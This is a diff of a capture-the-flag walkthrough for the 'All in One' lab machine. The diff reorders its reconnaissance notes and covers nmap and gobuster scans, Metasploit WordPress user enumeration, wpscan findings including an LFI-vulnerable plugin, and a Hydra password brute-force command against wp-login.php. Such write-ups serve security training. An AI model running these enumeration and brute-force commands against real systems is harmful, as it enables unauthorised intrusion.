@@ -1,7 +1,6 @@
 # All in One
-## Host Discovery
-N/A as TARGET_IP supplied.
-## Enumeration
+## Information Gathering
+## Enumeration and Scanning
 ```
 mkdir ~/Desktop/AllinOne
 cd ~/Desktop/AllinOne
@@ -134,9 +133,9 @@ PORT   STATE SERVICE
 * 2 x Low severity.
   * No public exploits.
 
+## Application Testing
 ### TCP/21
 * vsftpd 3.0.3
-  * No public exploits listed on Exploit db.
 * Connected anonymously - no files or folders exposed.
 ```
 ftp 10.10.74.123
@@ -170,11 +169,9 @@ gobuster dir --url http://TARGET_IP/ -w /usr/share/wordlists/SecLists/Discovery/
 /hackathons (Status: 200)
 /server-status (Status: 403)
 ```
-* Apache 2.4.29.
-  * No public exploits on Exploit db.
 #### /wordpress/
-* Single "All in One" page published with "elyana" as author.
-* enumerate Wordpress users using Metasploit.
+* "All in One" page published with "elyana" as author.
+* Enumerate Wordpress users using Metasploit.
 ```
 msf > use auxiliary/scanner/http/wordpress_login_enum
 msf auxiliary(wordpress_login_enum) > set rhosts TARGET_IP
@@ -186,7 +183,24 @@ msf auxiliary(wordpress_login_enum) > exploit
 ```
 [+] /wordpress - Found user 'elyana' with id 1
 ```
-* Use "wpscan" to identify WordPress vulnerabilites.
+#### wordpress/wp-login.php
+* Internet search reveals that default Wordpress credentials are admin / password.
+ * Trying these resulted in "Unknown username. Check again or try your email address." message.
+ * Attempting to logon using username "elyana" results in "Error: The password you entered for the username elyana is incorrect." message.
+#### /hackathons directory
+* Displays "Damn how much I hate the smell of *Vinegar :/* !!!" 
+* Viewing page source displays comments at bottom of page.
+```
+<!-- Dvc W@iyur@123 -->
+<!-- KeepGoing -->
+```
+## Vulnerablity Research
+### vsftpd 3.0.3
+  * No public exploits listed on Exploit db.
+### Apache 2.4.29
+  * No public exploits on Exploit db.
+### WordPress
+* Use "wpscan" to identify vulnerabilites.
 ```
 wpscan --update
 wpscan --url http://TARGET_IP/Wordpress > wpscan.txt
@@ -199,19 +213,8 @@ wpscan --url http://TARGET_IP/Wordpress > wpscan.txt
     * Vulnerable to [Local File Inclusion (LFI)](https://www.exploit-db.com/exploits/40290) public exploit listed on Exploit db.
   * Reflex Gallery 3.1.7.
     * No public exploits listed on Exploit db.
-#### wordpress/wp-login.php
-* Internet search reveals that default Wordpress credentials are admin / password.
- * Trying these resulted in "Unknown username. Check again or try your email address." message.
- * Attempting to logon using username "elyana" results in "Error: The password you entered for the username elyana is incorrect." message.
-#### /hackathons directory
-* Displays "Damn how much I hate the smell of *Vinegar :/* !!!" 
-* Viewing page source displays comments at bottom of page.
-```
-<!-- Dvc W@iyur@123 -->
-<!-- KeepGoing -->
-```
-
-## Initial Access
+## Exploitation
+### Initial Access
 * password spray "/wordpress/wp-login.php" using Hydra
 ```
 hydra -l elyana -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2FTARGET_IP%2Fwordpress%2Fwp-admin%2F&testcookie=1:Error" -T 64 -vV
